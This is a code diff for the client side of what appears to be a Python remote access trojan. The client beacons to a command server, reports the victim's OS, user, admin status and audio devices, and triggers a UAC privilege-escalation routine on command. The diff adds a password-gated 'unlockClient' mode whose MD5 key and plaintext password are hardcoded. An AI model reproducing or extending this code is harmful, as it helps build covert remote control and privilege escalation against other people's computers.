@@ -13,7 +13,8 @@ import threading
 HOST = '127.0.0.1'
 PORT = 4434
 ACTIVE = False
-UNLOCKED =False
+UNLOCKED = False
+SECRET = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123
 ID = ''
 secret_key = r'1705a7f91b40320a19db18912b72148e'  # MD5 key: paroli123
 
@@ -53,7 +54,7 @@ def check_info():
     return {
         'os_type':          os_type,
         'os':               os_name,
-        'protection':       str(ACTIVE),
+        'protection':       str(UNLOCKED),
         'user':             os_user,
         'privileges':       str(Shell32.IsUserAnAdmin()),
         'audio_device':     audio_input,
@@ -109,12 +110,12 @@ def data_receive(sock, end='[ENDOFMESSAGE]'):
 
 
 # Send Data Function
-def data_send(sock, message, mode, end='[ENDOFMESSAGE]'):
+def data_send(sock, message, mode, session_id='', end='[ENDOFMESSAGE]'):
     message = {
         'payload': message,
         'mode': mode,
         'from': 'client',
-        'to': '',
+        'session_id': session_id,
     }
     sock.sendall(str(message)+end)
 
@@ -145,6 +146,7 @@ def send_info(sock):
 
 def reactor():
     global ACTIVE
+    global UNLOCKED
     global ID
 
     while 1:
@@ -177,11 +179,36 @@ def reactor():
 
                     # After Initialized
                     while ACTIVE:
-                        data = data_receive(server_socket)
+                        try:
+                            data = data_receive(server_socket)
+                        except socket.error:
+                            break
 
                         # Run As Administrator Privileges
                         if data['payload'] == 'runAsAdmin':
                             uac_escalation()
+
+                        elif data['payload'].startswith('unlockClient '):
+                            pass_key = data['payload'].split()[-1]
+                            if pass_key == SECRET:
+                                UNLOCKED = True
+
+                                data_send(server_socket, 'loginSuccess', 'loginSuccess', session_id=data['session_id'])
+
+                                while UNLOCKED:
+
+                                    try:
+                                        data = data_receive(server_socket)
+                                    except socket.error:
+                                        break
+
+                            else:
+                                data_send(server_socket, 'notAuthorized', 'notAuthorized')
+
+
+                        else:
+                            data_send(server_socket, 'notAuthorized', 'notAuthorized')
+                            continue
 
             except socket.error:
                 server_socket.close()
